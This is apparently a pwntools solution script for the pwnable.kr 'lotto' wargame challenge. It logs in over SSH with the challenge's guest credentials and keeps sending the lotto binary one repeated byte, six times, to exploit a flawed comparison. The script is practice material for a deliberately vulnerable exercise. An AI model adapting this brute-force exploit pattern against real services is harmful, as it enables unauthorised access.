from pwn import *

context.log_level = "DEBUG"

s = ssh(host='pwnable.kr', port=2222, user='lotto', password='guest')
#s.download_file('lotto')
#s.download_file('lotto.c')

p = s.process("./lotto")

while (range(10)):
    p.recvuntil("3. Exit")
    p.sendline("1")

    p.recvuntil("Submit your 6 lotto bytes : ")
    p.sendline("******")
